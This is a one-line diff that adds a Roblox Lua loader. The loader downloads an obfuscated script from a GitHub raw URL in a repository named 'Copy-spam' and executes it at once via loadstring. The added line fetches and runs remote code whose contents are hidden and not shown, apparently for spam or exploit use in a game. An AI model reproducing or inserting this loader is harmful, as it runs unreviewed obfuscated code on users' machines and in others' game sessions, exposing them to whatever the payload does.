@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qosmakxokwm-maker/Copy-spam/refs/heads/main/obfuscated_script-1784127802320.lua.txt"))()
